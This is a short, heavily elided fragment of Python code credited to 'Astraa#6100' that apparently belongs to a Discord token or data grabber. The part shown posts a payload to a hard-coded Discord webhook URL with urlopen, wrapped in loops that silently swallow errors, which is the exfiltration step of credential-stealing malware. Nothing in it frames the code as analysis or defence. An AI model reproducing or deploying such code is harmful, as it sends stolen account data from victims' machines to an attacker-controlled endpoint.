...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1328001511405392005/785O-RJDSBRNK4T3ad37tg5Vdae6GZ008myseFi8LaPhvebLA4YfR3Kw0v2JdqnQ74Xt', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
